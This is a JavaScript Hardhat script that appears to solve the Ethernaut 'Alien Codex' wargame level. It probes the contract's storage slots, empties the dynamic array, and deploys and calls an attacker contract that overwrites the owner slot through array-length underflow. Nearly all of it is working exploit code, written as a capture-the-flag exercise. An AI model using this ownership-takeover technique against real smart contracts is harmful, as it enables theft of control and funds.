/*
You've uncovered an Alien contract. Claim ownership to complete the level.

  Things that might help

Understanding how array storage works
Understanding ABI specifications
Using a very underhanded approach
*/

// Main resource used to figure out the solution of this level: 
  // https://github.com/CeTesDev/EthernautLevels/tree/main/alien-codex
  // https://blog.dixitaditya.com/ethernaut-level-19-alien-codex
  // https://docs.soliditylang.org/en/v0.8.6/internals/layout_in_storage.html#mappings-and-dynamic-arrays

const { ethers } = require("ethers");
const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player] = await hre.ethers.getSigners();

  // Get an instance of the AlienCodex contract deployed by Ethernaut
  const AlienCodexAddress = "0x42220008f996e927c7C2a7F18dC479d3eee9649B"
  this.alienCodex = await hre.ethers.getContractAt("AlienCodex",AlienCodexAddress);

  console.log("Getting the initial values set on the Alien Codex contract");

  console.log(
    `
    Slot 0 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,0)} \n
    Slot 1 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,1)} \n
    Slot 2 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,2)} \n
    owner: ${await this.alienCodex.owner()}
    `
  );

  // Setting to true the contact variable to allow interaction with the AlienCodex contract
  const contactTX = await this.alienCodex.make_contact();
  // Await for the tx to be mined
  await contactTX.wait(); 

  // Pushing a new element to the array to see where the array's length is stored (The slot that reflects a change fro 0 to 1 is the one storing the array's length!)
  console.log("Pushing a new element to the array");
  const data = ethers.utils.formatBytes32String("Hello world");
  const pushNewElementTX = await this.alienCodex.record(data);
  // Await for the tx to be mined
  await pushNewElementTX.wait();

  console.log(
    `
    Visualizing the slots again to see which one is storing the array's length <===> Whichever slot shows an increase of 1 is the one storing the array's length!
    Slot 0 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,0)} \n
    Slot 1 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,1)} \n
    Slot 2 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,2)}
    `
  );

  console.log("Retracting the element that we pushed to discover the slot of the array's length! => The slot of the array's length must be 0 before executing the attack");
  const retractingTX = await this.alienCodex.retract();
  // Await for the tx to be mined
  await retractingTX.wait();

  console.log(
    `
    Validating that the slot that stores the array length is set to 0
    Slot 0 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,0)} \n
    Slot 1 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,1)} \n
    `
  );

  console.log("Deploying the Attacker contract...");

  // Deploy the attacker contract
  const AttackerContract = await hre.ethers.getContractFactory("AttackAlienCodex");
  this.attackerContract = await AttackerContract.connect(player).deploy(this.alienCodex.address);
  await this.attackerContract.deployed();

  console.log("Attacker Contract address: ", this.attackerContract.address);

  console.log("\n Executing the attack! \n");

  // The slot# where the array's length is stored will be required to determine the index that will point to the slot 0 to overwrite the owner!
  const arrayLengthStoredAtSlotNumber = 1;  // The slot 1 is the one storing the array's length!
  
  const attackTX = await this.attackerContract.connect(player).attackContract(arrayLengthStoredAtSlotNumber,{ gasLimit: 3000000 });
  // Await for the attackTX to be mined
  console.log("Waiting while the AlienCodex is been wreckd");
  await attackTX.wait();

  console.log("\n===============================================\n Results after the attack \n ===============================================\n");
  
  console.log(
    `
    Slot 0 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,0)} \n
    Slot 1 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,1)} \n
    Slot 2 ${await hre.ethers.provider.getStorageAt(this.alienCodex.address,2)} \n
    player address: ${player.address} \n
    owner: ${await this.alienCodex.owner()}
    `
  );
  console.log("Everything is ready to Submit the level instance!");
  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});